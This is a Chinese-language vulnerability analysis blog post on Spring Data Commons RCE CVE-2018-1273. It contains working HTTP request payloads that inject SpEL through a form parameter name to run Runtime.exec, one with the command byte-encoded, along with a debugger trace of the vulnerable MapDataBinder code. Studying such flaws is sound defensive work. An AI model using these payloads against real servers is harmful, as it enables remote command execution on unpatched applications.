---
title: Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）分析
description: 承接上两篇，学习了一下Spring框架以后，分析一下Spring的一些历史漏洞，这篇分析Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---

### 0x00 环境搭建和漏洞复现
首先从官网Demo中搭建环境

```
$ git clone https://github.com/spring-projects/spring-data-examples.git  # 官方仓库
$ git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d  # 回退到一个库版本计较旧的版本
```

然后用IDEA倒入Maven项目，等待它自动构建完成

然后运行`web/example`目录下的Application，访问本机端口有返回即可，IDEA会显示一些错误，不影响运行

burp发送请求包

```
POST /users HTTP/1.1
Host: 192.168.0.145:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8080/users
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Connection: close
Upgrade-Insecure-Requests: 1

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")]=
```

![0-1](https://milkfr.github.io/assets/images/posts/2019-11-17-analysis-spring-data-commons-rce/0-1.png)

### 0x01 漏洞分析
这个程序的入口非常好找，直接在`example.user.web.UserController`里打断点就可以

```
@Controller
@RequiredArgsConstructor
@RequestMapping("/users")
class UserController {
	@ModelAttribute("users")
	public Page<User> users(@PageableDefault(size = 5) Pageable pageable) {
		return userManagement.findAll(pageable);
	}
}
```

之后就是不断的step over，在弹出计算器的一步stop into

不断循环，有耐心就能找完调用栈

![1-1](https://milkfr.github.io/assets/images/posts/2019-11-17-analysis-spring-data-commons-rce/1-1.png)

最后定位到的是`org.springframework.data.web.MapDataBinder$MapPropertyAccessor`的`setPropertyValue`里的`expression.setValue(context, value)`，其实之后还可以继续debug，但是到这一步就没什么必要里

之前的步骤也没有看到什么特殊的地方，看来只是对Request进行上下文绑定的整个过程

```
class MapDataBinder extends WebDataBinder {
    private static class MapPropertyAccessor extends AbstractPropertyAccessor {
        // 省略
        public boolean isWritableProperty(String propertyName) {
            try {
                return this.getPropertyPath(propertyName) != null;
            } catch (PropertyReferenceException var3) {
                return false;
            }
        }
        public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {
            if (!this.isWritableProperty(propertyName)) {
                throw new NotWritablePropertyException(this.type, propertyName);
            } else {
                StandardEvaluationContext context = new StandardEvaluationContext();
                context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));
                context.setTypeConverter(new StandardTypeConverter(this.conversionService));
                context.setRootObject(this.map);
                Expression expression = PARSER.parseExpression(propertyName);
                PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();
                TypeInformation<?> owningType = leafProperty.getOwningType();
                TypeInformation<?> propertyType = leafProperty.getTypeInformation();
                propertyType = propertyName.endsWith("]") ? propertyType.getActualType() : propertyType;
                if (propertyType != null && this.conversionRequired(value, propertyType.getType())) {
                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());
                    if (descriptor == null) {
                        throw new IllegalStateException(String.format("Couldn't find PropertyDescriptor for %s on %s!", leafProperty.getSegment(), owningType.getType()));
                    }

                    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);
                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);
                    if (typeDescriptor == null) {
                        throw new IllegalStateException(String.format("Couldn't obtain type descriptor for method parameter %s!", methodParameter));
                    }

                    value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);
                }

                expression.setValue(context, value);
            }
        }
        private PropertyPath getPropertyPath(String propertyName) {
            String plainPropertyPath = propertyName.replaceAll("\\[.*?\\]", "");
            return PropertyPath.from(plainPropertyPath, this.type);
        }
    }
} 
```

最后的这个方法，只有对name进行了一次`isWritableProperty`校验参数名，实际上调用了`getPropertyPath`方法

![1-2](https://milkfr.github.io/assets/images/posts/2019-11-17-analysis-spring-data-commons-rce/1-2.png)

可以看到正则是把`[]`内的东西去掉，因此只留下了username，但是这里只是做判断，并没有对原来的参数过滤，接下来就用原来的参数名进行SpEl进行解析，解析成功就命令执行了

到这里分析结束

### 0x02 总结
框架本身就是允许`param_name[SpEL expression]`的方式执行SpEL表达式，还做了特殊处理，所以只有作者为什么要允许这样做很奇怪，感觉没有什么必要这里专门增加灵活性

网上的PoC`#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")`利用的SpEL表达式上下文，其实没必要，没有和Struts2对OGNL一样的过滤，可以直接用常用直接调用进程的方式触发命令执行

类似如下

```
POST /users HTTP/1.1
Host: 192.168.0.145:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8080/users
Content-Type: application/x-www-form-urlencoded
Content-Length: 232
Connection: close
Upgrade-Insecure-Requests: 1

username[T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111,112,101,110,32,47,83,121,115,116,101,109,47,65,112,112,108,105,99,97,116,105,111,110,115,47,67,97,108,99,117,108,97,116,111,114,46,97,112,112}))]=
```